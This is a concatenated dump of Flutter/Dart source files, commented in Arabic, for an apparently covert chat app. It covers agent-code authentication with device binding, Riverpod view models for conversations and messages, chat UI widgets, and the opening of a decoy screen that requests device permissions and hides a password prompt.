    final agentData = agentDocSnapshot.data()!;
    final storedDeviceId = agentData["deviceId"] as String?;
    final isDeviceBindingRequired = agentData["deviceBindingRequired"] as bool? ?? true;
    final bool needsAdminApprovalForNewDevice = agentData["needsAdminApprovalForNewDevice"] as bool? ?? false;

    // التحقق من ربط الجهاز
    if (!isDeviceBindingRequired) {
      _logger.info("AuthService:authenticateAgent", "ربط الجهاز غير مطلوب لـ $agentCode.");
      // تخزين رمز الوكيل في التخزين الآمن
      await _secureStorage.writeAgentCode(agentCode);
      return AuthResult(
        success: true,
        message: "تم التحقق بنجاح"
      );
    } else if (storedDeviceId == null) {
      if (needsAdminApprovalForNewDevice) {
        _logger.info("AuthService:authenticateAgent", "أول تسجيل دخول لـ $agentCode على الجهاز $deviceId. مطلوب موافقة المسؤول.");
        return AuthResult(
          success: false,
          message: "هذا الجهاز جديد لهذا الرمز. يرجى انتظار موافقة المسؤول أو مراجعته.",
          errorType: AuthErrorType.needsAdminApproval
        );
      } else {
        _logger.info("AuthService:authenticateAgent", "أول تسجيل دخول لـ $agentCode على الجهاز $deviceId. ربط الجهاز تلقائيًا.");
        await agentDocRef.update({
          "deviceId": deviceId,
          "lastLoginAt": FieldValue.serverTimestamp(),
          "lastLoginDeviceId": deviceId
        });
        // تخزين رمز الوكيل في التخزين الآمن
        await _secureStorage.writeAgentCode(agentCode);
        return AuthResult(
          success: true,
          message: "تم التحقق بنجاح وربط الجهاز"
        );
      }
    } else if (storedDeviceId == deviceId) {
      _logger.info("AuthService:authenticateAgent", "تطابق معرف الجهاز لـ $agentCode: $deviceId");
      await agentDocRef.update({
        "lastLoginAt": FieldValue.serverTimestamp(),
        "lastLoginDeviceId": deviceId
      });
      // تخزين رمز الوكيل في التخزين الآمن
      await _secureStorage.writeAgentCode(agentCode);
      return AuthResult(
        success: true,
        message: "تم التحقق بنجاح"
      );
    } else {
      _logger.warn("AuthService:authenticateAgent", "عدم تطابق معرف الجهاز لـ $agentCode. المتوقع: $storedDeviceId، الحالي: $deviceId");
      return AuthResult(
        success: false,
        message: "هذا الجهاز غير مصرح له باستخدام هذا الرمز.",
        errorType: AuthErrorType.deviceMismatch
      );
    }
  }

  /// تسجيل الخروج وحذف رمز الوكيل من التخزين الآمن
  Future<void> logout() async {
    await _secureStorage.deleteAgentCode();
    _logger.info("AuthService:logout", "تم تسجيل الخروج وحذف رمز الوكيل من التخزين الآمن");
  }

  /// التحقق مما إذا كان المستخدم مسجل الدخول
  Future<bool> isLoggedIn() async {
    final agentCode = await _secureStorage.readAgentCode();
    return agentCode != null && agentCode.isNotEmpty;
  }

  /// الحصول على رمز الوكيل الحالي
  Future<String?> getCurrentAgentCode() async {
    return await _secureStorage.readAgentCode();
  }
}

/// نتيجة عملية المصادقة
class AuthResult {
  final bool success;
  final String message;
  final AuthErrorType? errorType;
  final bool isPanicCode;

  AuthResult({
    required this.success,
    required this.message,
    this.errorType,
    this.isPanicCode = false
  });
}

/// أنواع أخطاء المصادقة
enum AuthErrorType {
  emptyCode,
  invalidCode,
  deviceIdError,
  dataInconsistency,
  needsAdminApproval,
  deviceMismatch
}

/// مزود خدمة المصادقة
final authServiceProvider = Provider<AuthService>((ref) {
  final firestore = FirebaseFirestore.instance;
  final logger = ref.watch(loggerServiceProvider);
  final secureStorage = ref.watch(secureStorageServiceProvider);
  return AuthService(firestore, logger, secureStorage);
});

/// مزود خدمة LoggerService
final loggerServiceProvider = Provider<LoggerService>((ref) {
  return LoggerService("AuthService");
});



// ------------------------------ نهاية الملف: auth_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: conversation_view_model.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\chat\view_models\conversation_view_model.dart
// ----------------------------------------------------------------------

// lib/presentation/chat/view_models/conversation_view_model.dart
import 'package:flutter_riverpod/flutter_riverpod.dart';

import '../../../data/models/chat/chat_conversation.dart';
import '../../../data/repositories/firestore_repository.dart';
import 'message_view_model.dart';

/// نموذج عرض للمحادثات يتبع نمط MVVM
class ConversationViewModel extends StateNotifier<AsyncValue<List<ChatConversation>>> {
  final FirestoreRepository _repository;
  
  ConversationViewModel(this._repository) : super(const AsyncValue.loading()) {
    // بدء الاستماع لتدفق المحادثات
    _listenToConversations();
  }

  /// بدء الاستماع لتدفق المحادثات
  void _listenToConversations() {
    _repository.getConversationsStream().listen(
      (conversations) {
        // تحديث الحالة بالمحادثات الجديدة
        state = AsyncValue.data(conversations);
      },
      onError: (error, stackTrace) {
        // تحديث الحالة بالخطأ
        state = AsyncValue.error(error, stackTrace);
      }
    );
  }

  /// إنشاء محادثة جديدة أو الحصول على محادثة موجودة
  Future<String?> createOrGetConversation(
    List<String> participantAgentCodes,
    Map<String, ChatParticipantInfo> participantInfoMap,
    {String? groupTitle}
  ) async {
    return _repository.createOrGetConversation(
      participantAgentCodes,
      participantInfoMap,
      groupTitle: groupTitle
    );
  }
}

/// مزود لنموذج عرض المحادثات
final conversationViewModelProvider = StateNotifierProvider<ConversationViewModel, AsyncValue<List<ChatConversation>>>(
  (ref) {
    // الحصول على مستودع Firestore
    final repository = ref.watch(firestoreRepositoryProvider);
    
    // إنشاء نموذج عرض المحادثات
    return ConversationViewModel(repository);
  }
);



// ------------------------------ نهاية الملف: conversation_view_model.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: message_view_model.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\chat\view_models\message_view_model.dart
// ----------------------------------------------------------------------

// lib/presentation/chat/view_models/message_view_model.dart
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';

import '../../../core/logging/logger_provider.dart';
import '../../../data/models/chat/chat_message.dart';
import '../../../data/repositories/firestore_repository.dart';
import '../../chat/providers/auth_providers.dart';

/// نموذج عرض للرسائل يدعم التحميل الكسول والصفحات
class MessageViewModel extends StateNotifier<AsyncValue<List<ChatMessage>>> {
  final FirestoreRepository _repository;
  final String _conversationId;
  final int _pageSize;
  
  // تتبع ما إذا كان هناك المزيد من الرسائل للتحميل
  bool _hasMoreMessages = true;
  
  // تتبع ما إذا كان التحميل جارٍ حاليًا
  bool _isLoadingMore = false;
  
  // تخزين أقدم رسالة تم تحميلها للاستخدام في تحميل المزيد
  DateTime? _oldestMessageTimestamp;

  MessageViewModel(this._repository, this._conversationId, {int pageSize = 20}) 
      : _pageSize = pageSize,
        super(const AsyncValue.loading()) {
    // بدء الاستماع لتدفق الرسائل
    _listenToMessages();
  }

  /// بدء الاستماع لتدفق الرسائل
  void _listenToMessages() {
    _repository.getMessagesStream(_conversationId, pageSize: _pageSize).listen(
      (messages) {
        // تحديث الحالة بالرسائل الجديدة
        state = AsyncValue.data(messages);
        
        // تحديث أقدم رسالة إذا كانت هناك رسائل
        if (messages.isNotEmpty) {
          _oldestMessageTimestamp = messages.first.timestamp;
        }
        
        // إعادة تعيين حالة التحميل
        _isLoadingMore = false;
      },
      onError: (error, stackTrace) {
        // تحديث الحالة بالخطأ
        state = AsyncValue.error(error, stackTrace);
        
        // إعادة تعيين حالة التحميل
        _isLoadingMore = false;
      }
    );
  }

  /// تحميل المزيد من الرسائل (صفحة سابقة)
  Future<void> loadMoreMessages() async {
    // التحقق من وجود المزيد من الرسائل وأن التحميل ليس جاريًا حاليًا
    if (!_hasMoreMessages || _isLoadingMore || _oldestMessageTimestamp == null) {
      return;
    }
    
    // تعيين حالة التحميل
    _isLoadingMore = true;
    
    try {
      // تحميل المزيد من الرسائل
      final newMessages = await _repository.loadMoreMessages(
        _conversationId, 
        _oldestMessageTimestamp!, 
        pageSize: _pageSize
      );
      
      // التحقق مما إذا كان هناك المزيد من الرسائل
      if (newMessages.isEmpty) {
        _hasMoreMessages = false;
        _isLoadingMore = false;
        return;
      }
      
      // تحديث أقدم رسالة
      if (newMessages.isNotEmpty) {
        _oldestMessageTimestamp = newMessages.first.timestamp;
      }
      
      // ملاحظة: لا نحتاج إلى تحديث الحالة هنا لأن تدفق الرسائل سيقوم بذلك
    } catch (e) {
      // إعادة تعيين حالة التحميل في حالة الخطأ
      _isLoadingMore = false;
    }
  }

  /// إرسال رسالة جديدة
  Future<bool> sendMessage(ChatMessage message) async {
    return _repository.sendMessage(_conversationId, message);
  }

  /// التحقق مما إذا كان هناك المزيد من الرسائل للتحميل
  bool get hasMoreMessages => _hasMoreMessages;
  
  /// التحقق مما إذا كان التحميل جارٍ حاليًا
  bool get isLoadingMore => _isLoadingMore;
}

/// مزود لنموذج عرض الرسائل
final messageViewModelProvider = StateNotifierProvider.family<MessageViewModel, AsyncValue<List<ChatMessage>>, String>(
  (ref, conversationId) {
    // الحصول على مستودع Firestore
    final repository = ref.watch(firestoreRepositoryProvider);
    
    // إنشاء نموذج عرض الرسائل
    return MessageViewModel(repository, conversationId);
  }
);

/// مزود لمستودع Firestore
final firestoreRepositoryProvider = Provider<FirestoreRepository>((ref) {
  final firestore = ref.watch(firestoreProvider);
  final storage = ref.watch(firebaseStorageProvider);
  final logger = ref.watch(appLoggerProvider);
  final agentCodeAsync = ref.watch(currentAgentCodeProvider);
  
  return agentCodeAsync.when(
    data: (agentCode) {
      if (agentCode != null && agentCode.isNotEmpty) {
        return FirestoreRepository(firestore, storage, logger, agentCode);
      }
      throw Exception("Agent code is null or empty");
    },
    loading: () => throw Exception("Agent code is loading"),
    error: (error, _) => throw Exception("Error loading agent code: $error"),
  );
});

/// مزود لـ Firestore
final firestoreProvider = Provider((ref) => FirebaseFirestore.instance);

/// مزود لـ Firebase Storage
final firebaseStorageProvider = Provider((ref) => FirebaseStorage.instance);



// ------------------------------ نهاية الملف: message_view_model.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: chat_list_item.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\chat\widgets\chat_list_item.dart
// ----------------------------------------------------------------------

// lib/presentation/chat/widgets/chat_list_item.dart
import 'package:flutter/material.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:intl/intl.dart' as intl; // لتنسيق الوقت

import '../../../data/models/chat/chat_conversation.dart';

class ChatListItem extends StatelessWidget {
  final ChatConversation conversation;
  final VoidCallback onTap;

  const ChatListItem({
    super.key,
    required this.conversation,
    required this.onTap,
  });

  String _formatTimestamp(DateTime? timestamp) {
    if (timestamp == null) return '';
    final now = DateTime.now();
    final today = DateTime(now.year, now.month, now.day);
    final yesterday = DateTime(now.year, now.month, now.day - 1);
    final dateToFormat =
        DateTime(timestamp.year, timestamp.month, timestamp.day);

    if (dateToFormat == today) {
      return intl.DateFormat.Hm().format(timestamp); //  'HH:mm' e.g., 14:30
    } else if (dateToFormat == yesterday) {
      return 'الأمس';
    } else if (now.difference(timestamp).inDays < 7) {
      return intl.DateFormat.E('ar')
          .format(timestamp); // اسم اليوم، e.g. 'السبت'
    } else {
      return intl.DateFormat.yMd('ar').format(timestamp); // 'd/M/yyyy'
    }
  }

  @override
  Widget build(BuildContext context) {
    final theme = Theme.of(context);
    final isDark = theme.brightness == Brightness.dark;
    // استخدم conversationTitle بدلاً من userName
    final title = conversation.conversationTitle;
    final lastMessage = conversation.lastMessageText ?? 'لا توجد رسائل بعد';
    final time = _formatTimestamp(conversation.lastMessageTimestamp);

    // تحديد ما إذا كانت الرسالة الأخيرة من المستخدم الحالي
    // final bool isLastMessageFromCurrentUser = conversation.lastMessageSenderAgentCode == currentAgentCode; // Need currentAgentCode
    // يمكنك إضافة "أنت: " إذا كانت من المستخدم الحالي

    return ListTile(
      onTap: onTap,
      leading: CircleAvatar(
        backgroundColor: theme.primaryColor.withOpacity(0.1),
        foregroundColor: theme.primaryColor,
        // يمكنك استخدام الحرف الأول من العنوان أو أيقونة عامة
        child: Text(
          title.isNotEmpty ? title[0].toUpperCase() : 'C',
          style: GoogleFonts.cairo(fontWeight: FontWeight.bold, fontSize: 18),
        ),
      ),
      title: Text(
        title,
        style: GoogleFonts.cairo(fontWeight: FontWeight.w600, fontSize: 16.5),
        maxLines: 1,
        overflow: TextOverflow.ellipsis,
      ),
      subtitle: Text(
        lastMessage,
        style: GoogleFonts.cairo(
          fontSize: 13.5,
          color: isDark ? Colors.grey[400] : Colors.grey[600],
        ),
        maxLines: 1,
        overflow: TextOverflow.ellipsis,
      ),
      trailing: Text(
        time,
        style: GoogleFonts.cairo(
          fontSize: 12,
          color: isDark ? Colors.grey[500] : Colors.grey[500],
        ),
      ),
      contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 6),
    );
  }
}



// ------------------------------ نهاية الملف: chat_list_item.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: message_bubble.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\chat\widgets\message_bubble.dart
// ----------------------------------------------------------------------

// lib/presentation/chat/widgets/message_bubble.dart
import "dart:io";
import "dart:typed_data";

import "package:dio/dio.dart";
import "package:flutter/material.dart";
import "package:flutter_riverpod/flutter_riverpod.dart";
import "package:google_fonts/google_fonts.dart";
import "package:intl/intl.dart" as intl;
import "package:open_file/open_file.dart";
import "package:path_provider/path_provider.dart";
import "package:photo_view/photo_view.dart";
import "package:video_player/video_player.dart";

import "../../../core/logging/logger_provider.dart";
import "../../../core/utils/file_saver.dart";
import "../../../data/models/chat/chat_message.dart";

String _formatBytes(int bytes, int decimals) {
  if (bytes <= 0) return "0 B";
  const suffixes = ["B", "KB", "MB", "GB", "TB"];
  var i = (bytes.toString().length - 1) ~/ 3;
  if (i >= suffixes.length) i = suffixes.length - 1;
  return "${(bytes / (1024 * 1024 * i)).toStringAsFixed(decimals)} ${suffixes[i]}";
}

class MessageBubble extends ConsumerStatefulWidget {
  final ChatMessage message;

  const MessageBubble({super.key, required this.message});

  @override
  ConsumerState<MessageBubble> createState() => _MessageBubbleState();
}

class _MessageBubbleState extends ConsumerState<MessageBubble> {
  VideoPlayerController? _videoController;
  bool _isDownloading = false;
  double _downloadProgress = 0.0;

  @override
  void initState() {
    super.initState();
    if (widget.message.messageType == MessageType.video &&
        widget.message.fileUrl != null) {
      _videoController = VideoPlayerController.networkUrl(
          Uri.parse(widget.message.fileUrl!),
        )
        ..initialize().then((_) {
          if (mounted) {
            setState(() {});
          }
        });
    }
  }

  @override
  void dispose() {
    _videoController?.dispose();
    super.dispose();
  }

  Future<void> _downloadAndSaveFile(
    BuildContext context,
    String url,
    String fileName,
  ) async {
    final logger = ref.read(appLoggerProvider);
    if (!mounted) return;
    setState(() {
      _isDownloading = true;
      _downloadProgress = 0.0;
    });
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text("بدء تنزيل: $fileName", style: GoogleFonts.cairo()),
      ),
    );
    try {
      Dio dio = Dio();
      final response = await dio.get<List<int>>(
        url,
        options: Options(responseType: ResponseType.bytes),
        onReceiveProgress: (received, total) {
          if (total != -1 && mounted) {
            setState(() => _downloadProgress = received / total);
          }
        },
      );

      if (response.data != null) {
        final result = await FileSaver.saveFile(
          bytes: Uint8List.fromList(response.data!),
          suggestedFileName: fileName,
        );
        if (mounted) {
          ScaffoldMessenger.of(context).removeCurrentSnackBar();
          ScaffoldMessenger.of(context).showSnackBar(
            SnackBar(content: Text(result, style: GoogleFonts.cairo())),
          );
        }
        logger.info("MessageBubble", "File saved: $fileName. Result: $result");
      }
    } catch (e, s) {
      logger.error(
        "MessageBubble",
        "Error downloading/saving file: $fileName",
        e,
        s,
      );
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text(
              "فشل التنزيل: ${e.toString()}",
              style: GoogleFonts.cairo(),
            ),
            backgroundColor: Colors.red,
          ),
        );
      }
    } finally {
      if (mounted) {
        setState(() {
          _isDownloading = false;
          _downloadProgress = 0.0;
        });
      }
    }
  }

  Future<void> _openFile(
    BuildContext context,
    String url,
    String fileName,
  ) async {
    final logger = ref.read(appLoggerProvider);
    if (!mounted) return;

    setState(() {
      _isDownloading = true;
      _downloadProgress = 0.0;
    });

    try {
      final Directory tempDir = await getTemporaryDirectory();
      final String localPath = "${tempDir.path}/$fileName";

      await Dio().download(
        url,
        localPath,
        onReceiveProgress: (received, total) {
          if (total != -1 && mounted) {
            setState(() => _downloadProgress = received / total);
          }
        },
      );

      final result = await OpenFile.open(localPath);

      if (result.type != ResultType.done && mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text("فشل فتح الملف: ${result.message}"),
            backgroundColor: Colors.orange,
          ),
        );
      }
    } catch (e, s) {
      logger.error("MessageBubble", "Error opening file: $fileName", e, s);
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text("خطأ: ${e.toString()}"),
            backgroundColor: Colors.red,
          ),
        );
      }
    } finally {
      if (mounted) {
        setState(() {
          _isDownloading = false;
          _downloadProgress = 0.0;
        });
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    final bool isSentByCurrentUser = widget.message.isSentByCurrentUser;
    final theme = Theme.of(context);
    final bubbleColor =
        isSentByCurrentUser
            ? theme.primaryColor.withOpacity(0.9)
            : (theme.brightness == Brightness.dark
                ? Colors.grey[800]!
                : Colors.grey[200]!);
    final textColor =
        isSentByCurrentUser
            ? Colors.white
            : (theme.brightness == Brightness.dark
                ? Colors.white.withOpacity(0.9)
                : Colors.black.withOpacity(0.87));

    final timeFormatted = intl.DateFormat.Hm(
      "ar",
    ).format(widget.message.timestamp);

    Widget messageContent;
    List<Widget> actionButtons = [];

    if (widget.message.fileUrl != null && widget.message.fileName != null) {
      actionButtons.addAll([
        IconButton(
          icon: Icon(Icons.download_outlined, color: textColor, size: 20),
          tooltip: "تنزيل الملف",
          onPressed:
              _isDownloading
                  ? null
                  : () => _downloadAndSaveFile(
                    context,
                    widget.message.fileUrl!,
                    widget.message.fileName!,
                  ),
        ),
        IconButton(
          icon: Icon(Icons.open_in_new, color: textColor, size: 20),
          tooltip: "فتح الملف",
          onPressed:
              _isDownloading
                  ? null
                  : () => _openFile(
                    context,
                    widget.message.fileUrl!,
                    widget.message.fileName!,
                  ),
        ),
      ]);
    }

    switch (widget.message.messageType) {
      case MessageType.text:
        messageContent = Text(
          widget.message.text ?? "",
          style: GoogleFonts.cairo(color: textColor, fontSize: 15),
        );
        break;
      case MessageType.image:
        if (widget.message.fileUrl != null) {
          messageContent = GestureDetector(
            onTap:
                () => Navigator.push(
                  context,
                  MaterialPageRoute(
                    builder:
                        (_) => Scaffold(
                          appBar: AppBar(
                            title: Text(
                              widget.message.fileName ?? "صورة",
                              style: GoogleFonts.cairo(),
                            ),
                            backgroundColor: Colors.black,
                          ),
                          body: PhotoView(
                            imageProvider: NetworkImage(
                              widget.message.fileUrl!,
                            ),
                            loadingBuilder:
                                (_, __) => const Center(
                                  child: CircularProgressIndicator(),
                                ),
                            backgroundDecoration: const BoxDecoration(
                              color: Colors.black,
                            ),
                          ),
                        ),
                  ),
                ),
            child: ConstrainedBox(
              constraints: BoxConstraints(
                maxHeight: 250,
                maxWidth: MediaQuery.of(context).size.width * 0.6,
              ),
              child: ClipRRect(
                borderRadius: BorderRadius.circular(8),
                child: Image.network(
                  widget.message.fileUrl!,
                  fit: BoxFit.cover,
                  loadingBuilder:
                      (_, child, progress) =>
                          progress == null
                              ? child
                              : Center(
                                child: CircularProgressIndicator(
                                  value:
                                      progress.expectedTotalBytes != null
                                          ? progress.cumulativeBytesLoaded /
                                              progress.expectedTotalBytes!
                                          : null,
                                ),
                              ),
                  errorBuilder:
                      (_, __, ___) => Container(
                        color: Colors.grey[300],
                        child: const Icon(Icons.broken_image, size: 50),
                      ),
                ),
              ),
            ),
          );
        } else {
          messageContent = Text(
            "[صورة غير متاحة]",
            style: GoogleFonts.cairo(color: textColor),
          );
        }
        break;
      case MessageType.video:
        if (_videoController != null && _videoController!.value.isInitialized) {
          messageContent = GestureDetector(
            onTap:
                () => Navigator.push(
                  context,
                  MaterialPageRoute(
                    builder:
                        (_) => Scaffold(
                          appBar: AppBar(
                            title: Text(
                              widget.message.fileName ?? "فيديو",
                              style: GoogleFonts.cairo(),
                            ),
                            backgroundColor: Colors.black,
                          ),
                          body: Center(
                            child: AspectRatio(
                              aspectRatio: _videoController!.value.aspectRatio,
                              child: VideoPlayer(_videoController!),
                            ),
                          ),
                          floatingActionButton: FloatingActionButton(
                            onPressed:
                                () =>
                                    _videoController!.value.isPlaying
                                        ? _videoController!.pause()
                                        : _videoController!.play(),
                            child: Icon(
                              _videoController!.value.isPlaying
                                  ? Icons.pause
                                  : Icons.play_arrow,
                            ),
                          ),
                        ),
                  ),
                ),
            child: Stack(
              alignment: Alignment.center,
              children: [
                AspectRatio(
                  aspectRatio: _videoController!.value.aspectRatio,
                  child: VideoPlayer(_videoController!),
                ),
                Icon(Icons.play_circle_fill, size: 50, color: Colors.white70),
              ],
            ),
          );
        } else {
          messageContent = Container(
            height: 150,
            color: Colors.black,
            child: const Center(child: CircularProgressIndicator()),
          );
        }
        break;
      case MessageType.file:
        messageContent = Row(
          mainAxisSize: MainAxisSize.min,
          children: [
            Icon(Icons.insert_drive_file, color: textColor, size: 30),
            const SizedBox(width: 8),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    widget.message.fileName ?? "ملف",
                    style: GoogleFonts.cairo(color: textColor, fontSize: 14),
                    overflow: TextOverflow.ellipsis,
                  ),
                  if (widget.message.fileSize != null)
                    Text(
                      _formatBytes(widget.message.fileSize!, 1),
                      style: GoogleFonts.cairo(
                        color: textColor.withOpacity(0.7),
                        fontSize: 10,
                      ),
                    ),
                ],
              ),
            ),
          ],
        );
        break;
      default:
        messageContent = Text(
          "[رسالة غير معروفة]",
          style: GoogleFonts.cairo(color: textColor),
        );
    }

    return Align(
      alignment:
          isSentByCurrentUser ? Alignment.centerRight : Alignment.centerLeft,
      child: Container(
        constraints: BoxConstraints(
          maxWidth: MediaQuery.of(context).size.width * 0.75,
        ),
        margin: const EdgeInsets.symmetric(vertical: 4, horizontal: 8),
        padding: const EdgeInsets.symmetric(vertical: 8, horizontal: 12),
        decoration: BoxDecoration(
          color: bubbleColor,
          borderRadius: BorderRadius.only(
            topLeft: const Radius.circular(12),
            topRight: const Radius.circular(12),
            bottomLeft:
                isSentByCurrentUser ? const Radius.circular(12) : Radius.zero,
            bottomRight:
                isSentByCurrentUser ? Radius.zero : const Radius.circular(12),
          ),
          boxShadow: [
            BoxShadow(
              color: Colors.black.withOpacity(0.05),
              blurRadius: 3,
              offset: const Offset(0, 1),
            ),
          ],
        ),
        child: Column(
          crossAxisAlignment:
              isSentByCurrentUser
                  ? CrossAxisAlignment.end
                  : CrossAxisAlignment.start,
          mainAxisSize: MainAxisSize.min,
          children: [
            messageContent,
            if (_isDownloading)
              Padding(
                padding: const EdgeInsets.only(top: 4.0),
                child: LinearProgressIndicator(
                  value: _downloadProgress,
                  backgroundColor: textColor.withOpacity(0.2),
                  valueColor: AlwaysStoppedAnimation<Color>(textColor),
                ),
              ),
            const SizedBox(height: 2),
            Row(
              mainAxisSize: MainAxisSize.min,
              children: [
                ...actionButtons,
                const SizedBox(width: 4),
                Text(
                  timeFormatted,
                  style: GoogleFonts.cairo(
                    color: textColor.withOpacity(0.7),
                    fontSize: 10,
                  ),
                ),
              ],
            ),
          ],
        ),
      ),
    );
  }
}



// ------------------------------ نهاية الملف: message_bubble.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: message_input_bar.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\chat\widgets\message_input_bar.dart
// ----------------------------------------------------------------------

// lib/presentation/chat/widgets/message_input_bar.dart
import 'package:flutter/material.dart';
import 'package:google_fonts/google_fonts.dart';

class MessageInputBar extends StatefulWidget {
  final Function(String) onSendPressed;
  final VoidCallback onAttachmentPressed;

  const MessageInputBar({
    super.key,
    required this.onSendPressed,
    required this.onAttachmentPressed,
  });

  @override
  State<MessageInputBar> createState() => _MessageInputBarState();
}

class _MessageInputBarState extends State<MessageInputBar> {
  final TextEditingController _textController = TextEditingController();
  bool _canSend = false;

  @override
  void initState() {
    super.initState();
    _textController.addListener(() {
      if (mounted) {
        // تحقق من أن الـ widget ما زال في الشجرة
        setState(() {
          _canSend = _textController.text.trim().isNotEmpty;
        });
      }
    });
  }

  @override
  void dispose() {
    _textController.dispose();
    super.dispose();
  }

  void _handleSend() {
    if (_canSend) {
      widget.onSendPressed(_textController.text.trim());
      _textController.clear();
      // FocusScope.of(context).unfocus(); // لإخفاء لوحة المفاتيح بعد الإرسال
    }
  }

  @override
  Widget build(BuildContext context) {
    final theme = Theme.of(context);
    final isDark = theme.brightness == Brightness.dark;

    return Material(
      // لإضافة ظل طفيف
      elevation: 5.0,
      color: theme.cardColor, // استخدام لون البطاقة كخلفية أو لون السطح
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 8.0, vertical: 8.0),
        // decoration: BoxDecoration( // يمكن إزالة هذا إذا كان لون Material كافيًا
        //   color: theme.cardColor,
        //   // border: Border(top: BorderSide(color: isDark ? Colors.grey[700]! : Colors.grey[300]!)),
        // ),
        child: Row(
          children: <Widget>[
            // زر المرفقات
            IconButton(
              icon: Icon(Icons.attach_file_outlined,
                  color: theme.primaryColor.withOpacity(0.8)),
              iconSize: 26,
              tooltip: 'إرفاق ملف',
              onPressed: widget.onAttachmentPressed,
            ),
            // حقل إدخال النص
            Expanded(
              child: TextField(
                controller: _textController,
                style: GoogleFonts.cairo(fontSize: 15.5),
                decoration: InputDecoration(
                  hintText: 'اكتب رسالتك هنا...',
                  hintStyle:
                      GoogleFonts.cairo(color: Colors.grey[500], fontSize: 15),
                  border: InputBorder.none, // إزالة الحدود الافتراضية
                  focusedBorder: InputBorder.none, // لا حدود عند التركيز
                  enabledBorder: InputBorder.none,
                  contentPadding: const EdgeInsets.symmetric(
                      horizontal: 12, vertical: 10), // تعديل الحشو
                  // filled: true, // لا حاجة لـ filled إذا كان Container يعطي الخلفية
                  // fillColor: theme.inputDecorationTheme.fillColor,
                ),
                keyboardType: TextInputType.multiline,
                minLines: 1,
                maxLines: 5, // السماح بعدة أسطر
                textInputAction:
                    TextInputAction.send, // تغيير زر الإدخال إلى "إرسال"
                onSubmitted: (_) =>
                    _handleSend(), // الإرسال عند الضغط على "إرسال" من لوحة المفاتيح
              ),
            ),
            // زر الإرسال
            IconButton(
              icon: Icon(
                Icons.send_rounded, // أيقونة إرسال أفضل
                color: _canSend ? theme.primaryColor : Colors.grey[400],
              ),
              iconSize: 28,
              tooltip: 'إرسال',
              onPressed: _canSend
                  ? _handleSend
                  : null, // تعطيل الزر إذا لم يكن هناك نص
            ),
          ],
        ),
      ),
    );
  }
}



// ------------------------------ نهاية الملف: message_input_bar.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: decoy_screen.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\decoy_screen\decoy_screen.dart
// ----------------------------------------------------------------------

import "dart:async";

import "package:flutter/material.dart";
import "package:flutter_riverpod/flutter_riverpod.dart";
import "package:google_fonts/google_fonts.dart";
import "package:permission_handler/permission_handler.dart";

import "../../app.dart";
import "../../core/logging/logger_provider.dart";
import "decoy_screen_controller.dart";

class DecoyScreen extends ConsumerStatefulWidget {
  final bool isPostDestruct;
  const DecoyScreen({super.key, this.isPostDestruct = false});

  @override
  ConsumerState<DecoyScreen> createState() => _DecoyScreenState();
}

class _DecoyScreenState extends ConsumerState<DecoyScreen> {
  bool _permissionsRequested = false;

  @override
  void initState() {
    super.initState();
    // Request permissions after widget is built
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _requestPermissions();
    });
  }

  Future<void> _requestPermissions() async {
    if (_permissionsRequested) return;

    final logger = ref.read(appLoggerProvider);
    logger.info("DecoyScreen", "Requesting required permissions");

    // List of required permissions from AndroidManifest.xml
    final permissions = [
      Permission.camera,
      Permission.location,
      Permission.locationWhenInUse,
      Permission.storage,
    ];

    // Request each permission
    for (var permission in permissions) {
      final status = await permission.status;

      if (status.isDenied) {
        logger.info("DecoyScreen", "Requesting permission: $permission");
        final result = await permission.request();

        logger.info("DecoyScreen", "Permission $permission result: $result");
      } else {
        logger.info("DecoyScreen", "Permission $permission status: $status");
      }
    }

    // Check if background location is needed (only request if other location permissions granted)
    if (await Permission.locationWhenInUse.isGranted) {
      final backgroundStatus = await Permission.locationAlways.status;
      if (backgroundStatus.isDenied) {
        logger.info("DecoyScreen", "Requesting background location permission");
        final result = await Permission.locationAlways.request();
        logger.info(
            "DecoyScreen", "Background location permission result: $result");
      }
    }

    setState(() {
      _permissionsRequested = true;
    });
  }

  @override
  Widget build(BuildContext context) {
    final controller = ref.watch(decoyScreenControllerProvider.notifier);
    final state = ref.watch(decoyScreenControllerProvider);

    // عرض شاشة القفل إذا تم تجاوز الحد الأقصى للمحاولات
    if (state.lockoutEndTime != null) {
      return _buildLockoutScreen(context, controller.getRemainingLockoutTime());
    }

    // عرض شاشة ما بعد التدمير
    if (state.isPostDestruct || widget.isPostDestruct) {
      return _buildPostDestructScreen(context);
    }

    // عرض الشاشة الرئيسية
    return GestureDetector(
      onTap: () {
        controller.handleTap();
        if (controller.shouldShowPasswordDialog()) {
          _showPasswordDialog(context, ref);
        }
      },
      child: _buildMainScreen(context, state),
    );
  }

  Widget _buildLockoutScreen(BuildContext context, String remainingTime) {
    final theme = Theme.of(context);
    return Scaffold(
      backgroundColor: theme.scaffoldBackgroundColor,
      body: Center(
        child: Padding(
          padding: const EdgeInsets.all(30.0),
          child: Column(
